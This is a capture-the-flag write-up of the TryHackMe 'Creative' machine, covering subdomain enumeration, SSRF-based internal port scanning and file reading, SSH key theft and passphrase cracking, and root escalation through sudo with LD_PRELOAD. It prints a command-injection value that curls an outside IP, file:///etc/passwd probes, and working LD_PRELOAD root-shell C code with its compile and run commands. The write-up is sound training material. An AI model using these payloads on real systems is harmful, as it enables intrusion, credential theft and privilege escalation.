---
layout: post
title: "Creative Tryhackme machine"
date: 2024-04-23 17:28:00.002653750 UTC
tags: Creative THM Tryhackme CTF
---

Hello there, this is my writeup for [Creative - THM](https://tryhackme.com/r/room/creative)

## Recon


I started nmap scanning to find services

```console

# Nmap 7.60 scan initiated Tue Apr 23 18:31:22 2024 as: nmap -sT -sV -vv -p- -oN nmap.txt 10.10.124.4
Nmap scan report for ip-10-10-124-4.eu-west-1.compute.internal (10.10.124.4)
Host is up, received arp-response (0.027s latency).
Scanned at 2024-04-23 18:31:22 BST for 111s
Not shown: 65533 filtered ports
Reason: 65533 no-responses
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack nginx 1.18.0 (Ubuntu)
MAC Address: 02:44:62:C9:A2:6B (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Apr 23 18:33:13 2024 -- 1 IP address (1 host up) scanned in 111.23 seconds

```

I noticed the Nginx Version `1.18.0`, So I do a quick searchsploit but no results

```console
root@thmbox:~# searchsploit Nginx 1.18.0
Exploits: No Results
Shellcodes: No Results

```

I tried to access the server through port 80, visting the IP will redirect to `http://creative.thm/` We can access the website If we add it to `/etc/hosts`

so I opened my one and only loved editor, VIM 💓

```console
root@thmbox:~# sudo vim /etc/hosts
```

and I add this line

![Vimehosts](/assets/img/CTF/THM/Creative/2_Vimhosts.png)

Now I can access it

![canaccess](/assets/img/CTF/THM/Creative/3_canaccess.png)

## Directory bruteforcing

```console
root@thmbox:~# gobuster dir -u http://creative.thm/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://creative.thm/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2024/04/23 19:02:30 Starting gobuster
===============================================================
/assets (Status: 301)
===============================================================
2024/04/23 19:03:00 Finished
===============================================================

```

Nothing important, so all we got is a static page,

## Subdomain Enumeration


```console
root@thmbox:~# ffuf -u http://creative.thm -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host:FUZZ.creative.thm" -fw 6

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v1.3.1
________________________________________________

 :: Method           : GET
 :: URL              : http://creative.thm
 :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.creative.thm
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Response words: 6
________________________________________________

beta                    [Status: 200, Size: 591, Words: 91, Lines: 20]
BETA                    [Status: 200, Size: 591, Words: 91, Lines: 20]
:: Progress: [114532/114532] :: Job [1/1] :: 12600 req/sec :: Duration: [0:00:13] :: Errors: 0 ::
root@thmbox:~#
```

I found beta and BETA, probably the same

and for some reason the `beta.creative.htb` is not loading I had to add it to my hosts again

`/etc/hosts`
```
10.10.124.4     creative.thm
10.10.124.4     beta.creative.thm

-- etc..
```

So now reloading and it works

## SSRF

![betalinketester](/assets/img/CTF/THM/Creative/4_betacreative.png)
It appears to be a URL tester

"This page provides the functionality that allows you to test a URL to see if it is alive. Enter a URL in the form below and click "Submit" to test it."

First thing that Came to my mind is SSRF

so I quickly launched a python server to test for SSRF

```console
python3 -m http.server
```

and tried submetting a URL

```
http://ATTACKBOXIP:8000
```

In my case it is
```
http://10.10.124.4:8000
```

But it says the link is dead? no request in the server logs

![Testing](/assets/img/CTF/THM/Creative/5_deadpyServer.png)

I tried loading some local files
```
file:///etc/passwd
```

also it says the link is Dead, I tried some command Injection payloads from [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Command%20Injection/Intruder/command-execution-unix.txt),

I can try enumerating internal ports using SSRF,

First I Intecepted the request using BurpSuite

```http
POST / HTTP/1.1
Host: beta.creative.thm
Content-Length: 48
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://beta.creative.thm
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://beta.creative.thm/
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Connection: close

url=%3Bcurl+http%3A%2F%2F10.6.65.93%3A8300%3B%23
```

we have a `url` POST parameter that we can change it to do Internal network port scanning

```http
POST / HTTP/1.1
Host: beta.creative.thm
Content-Length: 25
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://beta.creative.thm
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://beta.creative.thm/
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Connection: close

url=http://localhost:$PORT$

```

Let's save that into a file `request.txt`

Now each time the request should have a different port, We can use [SSRFMap](https://github.com/swisskyrepo/SSRFmap) or BurpIntruder but it is slow on Community + I prefer CLI

so I ran SSRFMap and Immedietly it shows port 80 is open

![ssrfmap_1](/assets/img/CTF/THM/Creative/SSRFMAP80.png)

After sometime it discovers that port 1337 is open internally

![ssrfmap_2](/assets/img/CTF/THM/Creative/SSRFMAP1337.png)

So let's try that in the URL Tester

![ssrfmap_2](/assets/img/CTF/THM/Creative/localhost1337.png)

Submitting that shows that we are able to access it

![dirlisting](/assets/img/CTF/THM/Creative/dirlisting.png)

We can't navigate directories directly,we have to submit it each time

So let's try home to see what users on the machine

![dirlistingHome](/assets/img/CTF/THM/Creative/homeRequest.png)

![homedirlst](/assets/img/CTF/THM/Creative/homedirlist.png)

We can see the user saad, Let's try to access `/home/saad`

`http://localhost:1337/home/saad`
<br>

![saadHome](/assets/img/CTF/THM/Creative/saadshome.png)

Nice! We can see user flag along with other intersting files

![saadHome](/assets/img/CTF/THM/Creative/Usertxtreq.png)
![userflag](/assets/img/CTF/THM/Creative/userflag.png)

If we try to access the root flag the same way we can't

but If we look at Saad's dot files, we can see `.ssh` exists! so we might be able to steal ssh keys

so let's try to steal ssh keys
`http://localhost:1337/home/saad/.ssh/`

![id_rsa](/assets/img/CTF/THM/Creative/id_rsa.png)
![id_rsa_content](/assets/img/CTF/THM/Creative/id_rsa_content.png)

To get this formated we can view source

![id_rsa_formatted](/assets/img/CTF/THM/Creative/id_rsa_formatted.png)

Now let's save it and connect

![SSH_passphrase](/assets/img/CTF/THM/Creative/passphrase_ssh.png)

It needs a passphrase,so we have to crack it, we can use ssh2john to create a crackable hash for john

![JohnHash](/assets/img/CTF/THM/Creative/createjohnHash.png)
![CrackedPassphrase](/assets/img/CTF/THM/Creative/CrackedPassphrase.png)

## Gaining a shell

Using that passphrase and the private key, I was able to login successfully using ssh

![LoggedIn](/assets/img/CTF/THM/Creative/sshsuccessful.png)
![IamIn](https://media3.giphy.com/media/v1.Y2lkPTc5MGI3NjExbWQ0cnhsN3hrNGwxeW5xMmRjODBlNmpkZmZra2kyejg1dTR4eXhqdSZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/iKBAAfYNDu1dowhnEj/giphy.gif)

## Privileges Escalation

I ran sudo -l, it asked about a password then I remembered the password I found earlier in `.bash_history`

![sudol](/assets/img/CTF/THM/Creative/sudol.png)

We have one binary we can run, ping, but also we have LD_PRELOAD Enabled, I have looked up ping on [GTFOBins](https://gtfobins.github.io/#ping) but nothing came up.

> ##### TIP
> LD_PRELOAD trick is a useful technique to influence the linkage of shared libraries and the resolution of symbols (functions) at runtime.
{: .block-tip }


now we can simply exploit LD_PRELOAD using the following C code

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/sh");
}
```

We compile it using the following command

```console
$ gcc -fPIC -shared -o exploit.so exploit.c -nostartfiles
```

![LD_PRELOAD](/assets/img/CTF/THM/Creative/ld_preload.png)

Now let's run ping with our shared object (exploit.so)
```console
$ sudo LD_PRELOAD=./exploit.so ping
```

![Iamroot](/assets/img/CTF/THM/Creative/r00tfl4g.png)

And that's it, I hope you enjoyed it.
